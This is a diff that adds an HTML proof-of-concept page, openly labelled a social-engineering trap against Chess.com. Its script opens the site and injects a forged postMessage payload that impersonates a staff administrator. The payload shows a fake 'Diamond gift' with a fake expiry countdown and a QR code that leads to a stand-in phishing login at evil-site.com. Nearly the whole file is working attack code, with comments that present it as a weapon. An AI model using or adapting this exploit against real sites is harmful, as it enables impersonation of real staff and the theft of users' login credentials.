@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chess.com REWARD TRAP</title>
+    <style>
+        body { 
+            background-color: #0d0d0d; 
+            color: #00ff41; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+        }
+        .card { 
+            background: #1a1a1a; 
+            padding: 40px; 
+            border: 2px solid #00ff41; 
+            border-radius: 10px; 
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); 
+            max-width: 500px;
+        }
+        h1 { margin: 0 0 20px; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
+        p { color: #cccccc; margin-bottom: 30px; font-size: 14px; }
+        
+        .btn { 
+            background: linear-gradient(45deg, #004d00, #00ff41); 
+            color: black; 
+            border: none; 
+            padding: 15px 40px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            text-transform: uppercase;
+            box-shadow: 0 0 15px #00ff41;
+        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 25px #00ff41; }
+        .btn:active { transform: scale(0.95); }
+
+        .status { margin-top: 20px; font-size: 12px; color: #555; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🎁 Social Engineering Trap</h1>
+    <p>Target: <b>Chess.com UI</b><br>Vector: <b>Legacy Message Handler</b><br>Payload: <b>Fake Diamond Gift + QR Phishing</b></p>
+    
+    <button class="btn" onclick="executeTrap()">Generate Fake Reward</button>
+    
+    <div class="status" id="log">System Ready...</div>
+</div>
+
+<script>
+    function executeTrap() {
+        const log = document.getElementById('log');
+        log.innerText = ">> Initializing Target Session...";
+        log.style.color = "#ffff00";
+
+        // 1. Open the target (The Victim's Tab)
+        const target = window.open('https://www.chess.com/home', '_blank');
+
+        // 2. Prepare the QR Code (The Weapon)
+        // This QR points to a fake login page. 
+        // In a real scenario, this would be your phishing site.
+        const phishLink = "https://evil-site.com/login?claim_prize=true"; 
+        const qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(phishLink)}&bgcolor=ffffff`;
+
+        // 3. Wait for the site to load (Stability Delay)
+        setTimeout(() => {
+            log.innerText = ">> Injecting 'Diamond Gift' Payload...";
+            
+            // 4. The ULTIMATE Social Engineering Payload
+            const trapPayload = {
+                event: "SHOW_MESSAGE_MODAL", 
+                user: {
+                    // Spoofing Admin/Staff Status
+                    userId: 41, // Impersonating Danny Rensch (Top Admin)
+                    isStaff: true,      // Adds "Staff" Badge (Red Shield)
+                    isDiamond: true,    // Adds "Diamond" Badge
+                    isOnline: true,     // Shows Green Dot (Active)
+                    
+                    // The Hook (The text they see first)
+                    name: "🏆 OFFICIAL GIFT: 1 YEAR DIAMOND", 
+                    
+                    // The Instruction (Replacing the username)
+                    username: "SCAN_QR_TO_ACTIVATE_NOW", 
+                    
+                    // Creating Urgency (Replacing the Country Name)
+                    country: { code: "US", name: "⚠️ Expires in 04:59" },
+                    
+                    // The Trap (The QR Code is injected as the Profile Picture)
+                    avatar_url: qrImage
+                }
+            };
+            
+            // 5. Send the payload twice to ensure it overrides any other UI
+            target.postMessage(trapPayload, '*');
+            setTimeout(() => target.postMessage(trapPayload, '*'), 500);
+
+            log.innerText = ">> ✅ TRAP DEPLOYED SUCCESSFULLY";
+            log.style.color = "#00ff41";
+
+        }, 3500); // 3.5 seconds delay
+    }
+</script>
+
+</body>
+</html>
